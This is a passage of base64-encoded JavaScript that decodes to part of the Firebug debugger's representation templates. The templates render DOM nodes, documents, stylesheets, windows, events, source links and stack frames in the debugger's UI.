g0KdGhpcy5UZXh0Tm9kZSA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLA0Kew0KICAgIHRhZzoNCiAgICAgICAgT0JKRUNUTElOSygNCiAgICAgICAgICAgICImbHQ7IiwNCiAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJub2RlVGFnIn0sICJUZXh0Tm9kZSIpLA0KICAgICAgICAgICAgIiZuYnNwO3RleHRDb250ZW50PSZxdW90OyIsIFNQQU4oeyJjbGFzcyI6ICJub2RlVmFsdWUifSwgIiRvYmplY3QudGV4dENvbnRlbnR8Y3JvcFN0cmluZyIpLCAiJnF1b3Q7IiwNCiAgICAgICAgICAgICImZ3Q7Ig0KICAgICAgICAgICAgKSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGNsYXNzTmFtZTogInRleHROb2RlIiwNCg0KICAgIHN1cHBvcnRzT2JqZWN0OiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgICAgICByZXR1cm4gb2JqZWN0IGluc3RhbmNlb2YgVGV4dDsNCiAgICB9DQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCnRoaXMuRG9jdW1lbnQgPSBkb21wbGF0ZShGaXJlYnVnLlJlcCwNCnsNCiAgICB0YWc6DQogICAgICAgIE9CSkVDVExJTksoIkRvY3VtZW50ICIsIFNQQU4oeyJjbGFzcyI6ICJvYmplY3RQcm9wVmFsdWUifSwgIiRvYmplY3R8Z2V0TG9jYXRpb24iKSksDQoNCiAgICBnZXRMb2NhdGlvbjogZnVuY3Rpb24oZG9jKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGRvYy5sb2NhdGlvbiA/IGdldEZpbGVOYW1lKGRvYy5sb2NhdGlvbi5ocmVmKSA6ICIiOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjbGFzc05hbWU6ICJvYmplY3QiLA0KDQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCkNCiAgICB7DQogICAgICAgIC8vcmV0dXJuIG9iamVjdCBpbnN0YW5jZW9mIERvY3VtZW50IHx8IG9iamVjdCBpbnN0YW5jZW9mIFhNTERvY3VtZW50Ow0KICAgICAgICByZXR1cm4gaW5zdGFuY2VPZihvYmplY3QsICJEb2N1bWVudCIpOw0KICAgIH0sDQoNCiAgICBicm93c2VPYmplY3Q6IGZ1bmN0aW9uKGRvYywgY29udGV4dCkNCiAgICB7DQogICAgICAgIG9wZW5OZXdUYWIoZG9jLmxvY2F0aW9uLmhyZWYpOw0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9LA0KDQogICAgcGVyc2lzdE9iamVjdDogZnVuY3Rpb24oZG9jLCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIHRoaXMucGVyc2lzdG9yOw0KICAgIH0sDQoNCiAgICBwZXJzaXN0b3I6IGZ1bmN0aW9uKGNvbnRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gY29udGV4dC53aW5kb3cuZG9jdW1lbnQ7DQogICAgfSwNCg0KICAgIGdldFRpdGxlOiBmdW5jdGlvbih3aW4sIGNvbnRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gImRvY3VtZW50IjsNCiAgICB9LA0KDQogICAgZ2V0VG9vbHRpcDogZnVuY3Rpb24oZG9jKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGRvYy5sb2NhdGlvbi5ocmVmOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5TdHlsZVNoZWV0ID0gZG9tcGxhdGUoRmlyZWJ1Zy5SZXAsDQp7DQogICAgdGFnOg0KICAgICAgICBPQkpFQ1RMSU5LKCJTdHlsZVNoZWV0ICIsIFNQQU4oeyJjbGFzcyI6ICJvYmplY3RQcm9wVmFsdWUifSwgIiRvYmplY3R8Z2V0TG9jYXRpb24iKSksDQoNCiAgICBnZXRMb2NhdGlvbjogZnVuY3Rpb24oc3R5bGVTaGVldCkNCiAgICB7DQogICAgICAgIHJldHVybiBnZXRGaWxlTmFtZShzdHlsZVNoZWV0LmhyZWYpOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjb3B5VVJMOiBmdW5jdGlvbihzdHlsZVNoZWV0KQ0KICAgIHsNCiAgICAgICAgY29weVRvQ2xpcGJvYXJkKHN0eWxlU2hlZXQuaHJlZik7DQogICAgfSwNCg0KICAgIG9wZW5JblRhYjogZnVuY3Rpb24oc3R5bGVTaGVldCkNCiAgICB7DQogICAgICAgIG9wZW5OZXdUYWIoc3R5bGVTaGVldC5ocmVmKTsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgY2xhc3NOYW1lOiAib2JqZWN0IiwNCg0KICAgIHN1cHBvcnRzT2JqZWN0OiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgICAgICAvL3JldHVybiBvYmplY3QgaW5zdGFuY2VvZiBDU1NTdHlsZVNoZWV0Ow0KICAgICAgICByZXR1cm4gaW5zdGFuY2VPZihvYmplY3QsICJDU1NTdHlsZVNoZWV0Iik7DQogICAgfSwNCg0KICAgIGJyb3dzZU9iamVjdDogZnVuY3Rpb24oc3R5bGVTaGVldCwgY29udGV4dCkNCiAgICB7DQogICAgICAgIG9wZW5OZXdUYWIoc3R5bGVTaGVldC5ocmVmKTsNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfSwNCg0KICAgIHBlcnNpc3RPYmplY3Q6IGZ1bmN0aW9uKHN0eWxlU2hlZXQsIGNvbnRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gYmluZCh0aGlzLnBlcnNpc3RvciwgdG9wLCBzdHlsZVNoZWV0LmhyZWYpOw0KICAgIH0sDQoNCiAgICBnZXRUb29sdGlwOiBmdW5jdGlvbihzdHlsZVNoZWV0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIHN0eWxlU2hlZXQuaHJlZjsNCiAgICB9LA0KDQogICAgZ2V0Q29udGV4dE1lbnVJdGVtczogZnVuY3Rpb24oc3R5bGVTaGVldCwgdGFyZ2V0LCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIFsNCiAgICAgICAgICAgIHtsYWJlbDogIkNvcHlMb2NhdGlvbiIsIGNvbW1hbmQ6IGJpbmRGaXhlZCh0aGlzLmNvcHlVUkwsIHRoaXMsIHN0eWxlU2hlZXQpIH0sDQogICAgICAgICAgICAiLSIsDQogICAgICAgICAgICB7bGFiZWw6ICJPcGVuSW5UYWIiLCBjb21tYW5kOiBiaW5kRml4ZWQodGhpcy5vcGVuSW5UYWIsIHRoaXMsIHN0eWxlU2hlZXQpIH0NCiAgICAgICAgXTsNCiAgICB9LA0KDQogICAgcGVyc2lzdG9yOiBmdW5jdGlvbihjb250ZXh0LCBocmVmKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGdldFN0eWxlU2hlZXRCeUhyZWYoaHJlZiwgY29udGV4dCk7DQogICAgfQ0KfSk7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp0aGlzLldpbmRvdyA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLA0Kew0KICAgIHRhZzoNCiAgICAgICAgT0JKRUNUTElOSygiV2luZG93ICIsIFNQQU4oeyJjbGFzcyI6ICJvYmplY3RQcm9wVmFsdWUifSwgIiRvYmplY3R8Z2V0TG9jYXRpb24iKSksDQoNCiAgICBnZXRMb2NhdGlvbjogZnVuY3Rpb24od2luKQ0KICAgIHsNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiAod2luICYmIHdpbi5sb2NhdGlvbiAmJiAhd2luLmNsb3NlZCkgPyBnZXRGaWxlTmFtZSh3aW4ubG9jYXRpb24uaHJlZikgOiAiIjsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAoZXhjKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJyZXBzLldpbmRvdyB3aW5kb3cgY2xvc2VkPyIpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGNsYXNzTmFtZTogIm9iamVjdCIsDQoNCiAgICBzdXBwb3J0c09iamVjdDogZnVuY3Rpb24ob2JqZWN0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGluc3RhbmNlT2Yob2JqZWN0LCAiV2luZG93Iik7DQogICAgfSwNCg0KICAgIGJyb3dzZU9iamVjdDogZnVuY3Rpb24od2luLCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgb3Blbk5ld1RhYih3aW4ubG9jYXRpb24uaHJlZik7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0sDQoNCiAgICBwZXJzaXN0T2JqZWN0OiBmdW5jdGlvbih3aW4sIGNvbnRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gdGhpcy5wZXJzaXN0b3I7DQogICAgfSwNCg0KICAgIHBlcnNpc3RvcjogZnVuY3Rpb24oY29udGV4dCkNCiAgICB7DQogICAgICAgIHJldHVybiBjb250ZXh0LndpbmRvdzsNCiAgICB9LA0KDQogICAgZ2V0VGl0bGU6IGZ1bmN0aW9uKHdpbiwgY29udGV4dCkNCiAgICB7DQogICAgICAgIHJldHVybiAid2luZG93IjsNCiAgICB9LA0KDQogICAgZ2V0VG9vbHRpcDogZnVuY3Rpb24od2luKQ0KICAgIHsNCiAgICAgICAgaWYgKHdpbiAmJiAhd2luLmNsb3NlZCkNCiAgICAgICAgICAgIHJldHVybiB3aW4ubG9jYXRpb24uaHJlZjsNCiAgICB9DQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCnRoaXMuRXZlbnQgPSBkb21wbGF0ZShGaXJlYnVnLlJlcCwNCnsNCiAgICB0YWc6IFRBRygiJGNvcHlFdmVudFRhZyIsIHtvYmplY3Q6ICIkb2JqZWN0fGNvcHlFdmVudCJ9KSwNCg0KICAgIGNvcHlFdmVudFRhZzoNCiAgICAgICAgT0JKRUNUTElOSygiJG9iamVjdHxzdW1tYXJpemVFdmVudCIpLA0KDQogICAgc3VtbWFyaXplRXZlbnQ6IGZ1bmN0aW9uKGV2ZW50KQ0KICAgIHsNCiAgICAgICAgdmFyIGluZm8gPSBbZXZlbnQudHlwZSwgJyAnXTsNCg0KICAgICAgICB2YXIgZXZlbnRGYW1pbHkgPSBnZXRFdmVudEZhbWlseShldmVudC50eXBlKTsNCiAgICAgICAgaWYgKGV2ZW50RmFtaWx5ID09ICJtb3VzZSIpDQogICAgICAgICAgICBpbmZvLnB1c2goImNsaWVudFg9IiwgZXZlbnQuY2xpZW50WCwgIiwgY2xpZW50WT0iLCBldmVudC5jbGllbnRZKTsNCiAgICAgICAgZWxzZSBpZiAoZXZlbnRGYW1pbHkgPT0gImtleSIpDQogICAgICAgICAgICBpbmZvLnB1c2goImNoYXJDb2RlPSIsIGV2ZW50LmNoYXJDb2RlLCAiLCBrZXlDb2RlPSIsIGV2ZW50LmtleUNvZGUpOw0KDQogICAgICAgIHJldHVybiBpbmZvLmpvaW4oIiIpOw0KICAgIH0sDQoNCiAgICBjb3B5RXZlbnQ6IGZ1bmN0aW9uKGV2ZW50KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIG5ldyBFdmVudENvcHkoZXZlbnQpOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjbGFzc05hbWU6ICJvYmplY3QiLA0KDQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCkNCiAgICB7DQogICAgICAgIC8vcmV0dXJuIG9iamVjdCBpbnN0YW5jZW9mIEV2ZW50IHx8IG9iamVjdCBpbnN0YW5jZW9mIEV2ZW50Q29weTsNCiAgICAgICAgcmV0dXJuIGluc3RhbmNlT2Yob2JqZWN0LCAiRXZlbnQiKSB8fCBpbnN0YW5jZU9mKG9iamVjdCwgIkV2ZW50Q29weSIpOw0KICAgIH0sDQoNCiAgICBnZXRUaXRsZTogZnVuY3Rpb24oZXZlbnQsIGNvbnRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gIkV2ZW50ICIgKyBldmVudC50eXBlOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5Tb3VyY2VMaW5rID0gZG9tcGxhdGUoRmlyZWJ1Zy5SZXAsDQp7DQogICAgdGFnOg0KICAgICAgICBPQkpFQ1RMSU5LKHskY29sbGFwc2VkOiAiJG9iamVjdHxoaWRlU291cmNlTGluayJ9LCAiJG9iamVjdHxnZXRTb3VyY2VMaW5rVGl0bGUiKSwNCg0KICAgIGhpZGVTb3VyY2VMaW5rOiBmdW5jdGlvbihzb3VyY2VMaW5rKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIHNvdXJjZUxpbmsgPyBzb3VyY2VMaW5rLmhyZWYuaW5kZXhPZigiWFBDU2FmZUpTT2JqZWN0V3JhcHBlciIpICE9IC0xIDogdHJ1ZTsNCiAgICB9LA0KDQogICAgZ2V0U291cmNlTGlua1RpdGxlOiBmdW5jdGlvbihzb3VyY2VMaW5rKQ0KICAgIHsNCiAgICAgICAgaWYgKCFzb3VyY2VMaW5rKQ0KICAgICAgICAgICAgcmV0dXJuICIiOw0KDQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgZmlsZU5hbWUgPSBnZXRGaWxlTmFtZShzb3VyY2VMaW5rLmhyZWYpOw0KICAgICAgICAgICAgZmlsZU5hbWUgPSBkZWNvZGVVUklDb21wb25lbnQoZmlsZU5hbWUpOw0KICAgICAgICAgICAgZmlsZU5hbWUgPSBjcm9wU3RyaW5nKGZpbGVOYW1lLCAxNyk7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2goZXhjKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJyZXBzLmdldFNvdXJjZUxpbmtUaXRsZSBkZWNvZGVVUklDb21wb25lbnQgZmFpbHMgZm9yIFwnIitmaWxlTmFtZSsiXCc6ICIrZXhjLCBleGMpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICByZXR1cm4gdHlwZW9mIHNvdXJjZUxpbmsubGluZSA9PSAibnVtYmVyIiA/DQogICAgICAgICAgICAgICAgZmlsZU5hbWUgKyAiIChsaW5lICIgKyBzb3VyY2VMaW5rLmxpbmUgKyAiKSIgOg0KICAgICAgICAgICAgICAgIGZpbGVOYW1lOw0KICAgICAgICANCiAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8NCiAgICAgICAgLy9yZXR1cm4gJFNUUkYoIkxpbmUiLCBbZmlsZU5hbWUsIHNvdXJjZUxpbmsubGluZV0pOw0KICAgIH0sDQoNCiAgICBjb3B5TGluazogZnVuY3Rpb24oc291cmNlTGluaykNCiAgICB7DQogICAgICAgIGNvcHlUb0NsaXBib2FyZChzb3VyY2VMaW5rLmhyZWYpOw0KICAgIH0sDQoNCiAgICBvcGVuSW5UYWI6IGZ1bmN0aW9uKHNvdXJjZUxpbmspDQogICAgew0KICAgICAgICBvcGVuTmV3VGFiKHNvdXJjZUxpbmsuaHJlZik7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGNsYXNzTmFtZTogInNvdXJjZUxpbmsiLA0KDQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCkNCiAgICB7DQogICAgICAgIHJldHVybiBvYmplY3QgaW5zdGFuY2VvZiBTb3VyY2VMaW5rOw0KICAgIH0sDQoNCiAgICBnZXRUb29sdGlwOiBmdW5jdGlvbihzb3VyY2VMaW5rKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGRlY29kZVVSSShzb3VyY2VMaW5rLmhyZWYpOw0KICAgIH0sDQoNCiAgICBpbnNwZWN0T2JqZWN0OiBmdW5jdGlvbihzb3VyY2VMaW5rLCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgaWYgKHNvdXJjZUxpbmsudHlwZSA9PSAianMiKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgc2NyaXB0RmlsZSA9IGdldFNvdXJjZUZpbGVCeUhyZWYoc291cmNlTGluay5ocmVmLCBjb250ZXh0KTsNCiAgICAgICAgICAgIGlmIChzY3JpcHRGaWxlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBGaXJlYnVnLmNocm9tZS5zZWxlY3Qoc291cmNlTGluayk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAoc291cmNlTGluay50eXBlID09ICJjc3MiKQ0KICAgICAgICB7DQogICAgICAgICAgICAvLyBJZiBhbiBvYmplY3QgaXMgZGVmaW5lZCwgdHJlYXQgaXQgYXMgdGhlIGhpZ2hlc3QgcHJpb3JpdHkgZm9yDQogICAgICAgICAgICAvLyBpbnNwZWN0IGFjdGlvbnMNCiAgICAgICAgICAgIGlmIChzb3VyY2VMaW5rLm9iamVjdCkgew0KICAgICAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLnNlbGVjdChzb3VyY2VMaW5rLm9iamVjdCk7DQogICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICB2YXIgc3R5bGVzaGVldCA9IGdldFN0eWxlU2hlZXRCeUhyZWYoc291cmNlTGluay5ocmVmLCBjb250ZXh0KTsNCiAgICAgICAgICAgIGlmIChzdHlsZXNoZWV0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBvd25lck5vZGUgPSBzdHlsZXNoZWV0Lm93bmVyTm9kZTsNCiAgICAgICAgICAgICAgICBpZiAob3duZXJOb2RlKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgRmlyZWJ1Zy5jaHJvbWUuc2VsZWN0KHNvdXJjZUxpbmssICJodG1sIik7DQogICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB2YXIgcGFuZWwgPSBjb250ZXh0LmdldFBhbmVsKCJzdHlsZXNoZWV0Iik7DQogICAgICAgICAgICAgICAgaWYgKHBhbmVsICYmIHBhbmVsLmdldFJ1bGVCeUxpbmUoc3R5bGVzaGVldCwgc291cmNlTGluay5saW5lKSkNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEZpcmVidWcuY2hyb21lLnNlbGVjdChzb3VyY2VMaW5rKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIC8vIEZhbGxiYWNrIGlzIHRvIGp1c3Qgb3BlbiB0aGUgdmlldy1zb3VyY2Ugd2luZG93IG9uIHRoZSBmaWxlDQogICAgICAgIHZpZXdTb3VyY2Uoc291cmNlTGluay5ocmVmLCBzb3VyY2VMaW5rLmxpbmUpOw0KICAgIH0sDQoNCiAgICBicm93c2VPYmplY3Q6IGZ1bmN0aW9uKHNvdXJjZUxpbmssIGNvbnRleHQpDQogICAgew0KICAgICAgICBvcGVuTmV3VGFiKHNvdXJjZUxpbmsuaHJlZik7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0sDQoNCiAgICBnZXRDb250ZXh0TWVudUl0ZW1zOiBmdW5jdGlvbihzb3VyY2VMaW5rLCB0YXJnZXQsIGNvbnRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gWw0KICAgICAgICAgICAge2xhYmVsOiAiQ29weUxvY2F0aW9uIiwgY29tbWFuZDogYmluZEZpeGVkKHRoaXMuY29weUxpbmssIHRoaXMsIHNvdXJjZUxpbmspIH0sDQogICAgICAgICAgICAiLSIsDQogICAgICAgICAgICB7bGFiZWw6ICJPcGVuSW5UYWIiLCBjb21tYW5kOiBiaW5kRml4ZWQodGhpcy5vcGVuSW5UYWIsIHRoaXMsIHNvdXJjZUxpbmspIH0NCiAgICAgICAgXTsNCiAgICB9DQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCnRoaXMuU291cmNlRmlsZSA9IGRvbXBsYXRlKHRoaXMuU291cmNlTGluaywNCnsNCiAgICB0YWc6DQogICAgICAgIE9CSkVDVExJTksoeyRjb2xsYXBzZWQ6ICIkb2JqZWN0fGhpZGVTb3VyY2VMaW5rIn0sICIkb2JqZWN0fGdldFNvdXJjZUxpbmtUaXRsZSIpLA0KDQogICAgcGVyc2lzdG9yOiBmdW5jdGlvbihjb250ZXh0LCBocmVmKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGdldFNvdXJjZUZpbGVCeUhyZWYoaHJlZiwgY29udGV4dCk7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGNsYXNzTmFtZTogInNvdXJjZUZpbGUiLA0KDQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCkNCiAgICB7DQogICAgICAgIHJldHVybiBvYmplY3QgaW5zdGFuY2VvZiBTb3VyY2VGaWxlOw0KICAgIH0sDQoNCiAgICBwZXJzaXN0T2JqZWN0OiBmdW5jdGlvbihzb3VyY2VGaWxlKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGJpbmQodGhpcy5wZXJzaXN0b3IsIHRvcCwgc291cmNlRmlsZS5ocmVmKTsNCiAgICB9LA0KDQogICAgYnJvd3NlT2JqZWN0OiBmdW5jdGlvbihzb3VyY2VMaW5rLCBjb250ZXh0KQ0KICAgIHsNCiAgICB9LA0KDQogICAgZ2V0VG9vbHRpcDogZnVuY3Rpb24oc291cmNlRmlsZSkNCiAgICB7DQogICAgICAgIHJldHVybiBzb3VyY2VGaWxlLmhyZWY7DQogICAgfQ0KfSk7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp0aGlzLlN0YWNrRnJhbWUgPSBkb21wbGF0ZShGaXJlYnVnLlJlcCwgIC8vIFhYWGpqYiBTaW5jZSB0aGUgcmVwT2JqZWN0IGlzIGZuIHRoZSBzdGFjayBkb2VzIG5vdCBoYXZlIGNvcnJlY3QgbGluZSBudW1iZXJzDQp7DQogICAgdGFnOg0KICAgICAgICBPQkpFQ1RCTE9DSygNCiAgICAgICAgICAgIEEoeyJjbGFzcyI6ICJvYmplY3RMaW5rIG9iamVjdExpbmstZnVuY3Rpb24gZm9jdXNSb3cgYTExeUZvY3VzIiwgX3JlcE9iamVjdDogIiRvYmplY3QuZm4ifSwgIiRvYmplY3R8Z2V0Q2FsbE5hbWUiKSwNCiAgICAgICAgICAgICIgKCAiLA0KICAgICAgICAgICAgRk9SKCJhcmciLCAiJG9iamVjdHxhcmdJdGVyYXRvciIsDQogICAgICAgICAgICAgICAgVEFHKCIkYXJnLnRhZyIsIHtvYmplY3Q6ICIkYXJnLnZhbHVlIn0pLA0KICAgICAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJhcnJheUNvbW1hIn0sICIkYXJnLmRlbGltIikNCiAgICAgICAgICAgICksDQogICAgICAgICAgICAiICkiLA0KICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogIm9iamVjdExpbmstc291cmNlTGluayBvYmplY3RMaW5rIn0sICIkb2JqZWN0fGdldFNvdXJjZUxpbmtUaXRsZSIpDQogICAgICAgICksDQoNCiAgICBnZXRDYWxsTmFtZTogZnVuY3Rpb24oZnJhbWUpDQogICAgew0KICAgICAgICAvL1RPRE86IHh4eHBlZHJvIHJlcHMgU3RhY2tGcmFtZQ0KICAgICAgICByZXR1cm4gZnJhbWUubmFtZSB8fCAiYW5vbnltb3VzIjsNCiAgICAgICAgDQogICAgICAgIC8vcmV0dXJuIGdldEZ1bmN0aW9uTmFtZShmcmFtZS5zY3JpcHQsIGZyYW1lLmNvbnRleHQpOw0KICAgIH0sDQoNCiAgICBnZXRTb3VyY2VMaW5rVGl0bGU6IGZ1bmN0aW9uKGZyYW1lKQ0KICAgIHsNCiAgICAgICAgLy9UT0RPOiB4eHhwZWRybyByZXBzIFN0YWNrRnJhbWUNCiAgICAgICAgdmFyIGZpbGVOYW1lID0gY3JvcFN0cmluZyhnZXRGaWxlTmFtZShmcmFtZS5ocmVmKSwgMjApOw0KICAgICAgICByZXR1cm4gZmlsZU5hbWUgKyAoZnJhbWUubGluZU5vID8gIiAobGluZSAiICsgZnJhbWUubGluZU5vICsgIikiIDogIiIpOw0KICAgICAgICANCiAgICAgICAgdmFyIGZpbGVOYW1lID0gY3JvcFN0cmluZyhnZXRGaWxlTmFtZShmcmFtZS5ocmVmKSwgMTcpOw0KICAgICAgICByZXR1cm4gJFNUUkYoIkxpbmUiLCBbZmlsZU5hbWUsIGZyYW1lLmxpbmVOb10pOw0KICAgIH0sDQoNCiAgICBhcmdJdGVyYXRvcjogZnVuY3Rpb24oZnJhbWUpDQogICAgew0KICAgICAgICBpZiAoIWZyYW1lLmFyZ3MpDQogICAgICAgICAgICByZXR1cm4gW107DQoNCiAgICAgICAgdmFyIGl0ZW1zID0gW107DQoNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBmcmFtZS5hcmdzLmxlbmd0aDsgKytpKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgYXJnID0gZnJhbWUuYXJnc1tpXTsNCg0KICAgICAgICAgICAgaWYgKCFhcmcpDQogICAgICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgICAgIHZhciByZXAgPSBGaXJlYnVnLmdldFJlcChhcmcudmFsdWUpOw0KICAgICAgICAgICAgdmFyIHRhZyA9IHJlcC5zaG9ydFRhZyA/IHJlcC5zaG9ydFRhZyA6IHJlcC50YWc7DQoNCiAgICAgICAgICAgIHZhciBkZWxpbSA9IChpID09IGZyYW1lLmFyZ3MubGVuZ3RoLTEgPyAiIiA6ICIsICIpOw0KDQogICAgICAgICAgICBpdGVtcy5wdXNoKHtuYW1lOiBhcmcubmFtZSwgdmFsdWU6IGFyZy52YWx1ZSwgdGFnOiB0YWcsIGRlbGltOiBkZWxpbX0pOw0KICAgICAgICB9DQoNCiAgICAgICAgcmV0dXJuIGl0ZW1zOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjbGFzc05hbWU6ICJzdGFja0ZyYW1lIiwNCg0KICAgIHN1cHBvcnRzT2JqZWN0OiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgICAgICByZXR1cm4gb2JqZWN0IGluc3RhbmNlb2YgU3RhY2tGcmFtZTsNCiAgICB9LA0KDQogICAgaW5zcGVjdE9iamVjdDogZnVuY3Rpb24oc3RhY2tGcmFtZSwgY29udGV4dCkNCiAgICB7DQogICAgICAgIHZhciBzb3VyY2VMaW5rID0gbmV3IFNvdXJjZUxpbmsoc3RhY2tGcmFtZS5ocmVmLCBzdGFja0ZyYW1lLmxpbmVObywgImpzIik7DQogICAgICAgIEZpcmVidWcuY2hyb21lLnNlbGVjdChzb3VyY2VMaW5rKTsNCiAgICB9LA0KDQogICAgZ2V0VG9vbHRpcDog